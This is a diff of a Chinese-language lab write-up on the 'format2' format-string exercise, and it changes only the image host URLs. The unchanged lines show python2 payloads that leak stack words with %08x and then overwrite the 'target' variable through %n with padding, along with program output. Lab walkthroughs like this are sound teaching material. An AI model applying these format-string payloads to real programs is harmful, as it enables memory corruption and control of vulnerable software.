@@ -53,10 +53,10 @@ int main(int argc, char **argv)
 ```c
 python2 -c "print 'AAAA' + '%08x.'*10 + '[%08x]'" | ./format2
 ```
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915195855544.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250915195855544.png)
 
 **减少`%08x.`的数量：**
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915200029758.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250915200029758.png)
 
 **将字符串替换为target的地址**
 ```c
@@ -64,7 +64,7 @@ python2 -c "print '\xe4\x96\x04\x08' + '%08x.'*3 + '[%08n]'" | ./format2
 �00000200.f7f965c0.00000000.[]
 target is 32 :(
 ```
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915200524428.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250915200524428.png)
 
 **添加`%<num>c` 用于填充长度：**
 ```c
@@ -75,4 +75,4 @@ python2 -c "print '\xe4\x96\x04\x08' + '%60c' + '%4\$n'" | ./format2
 #- 第 2、3、4 个参数：栈上后续内容，第 4 个正好是我们放的地址（需要调试确认偏移，这里假设是 4）
 ```
 
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915200938613.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250915200938613.png)
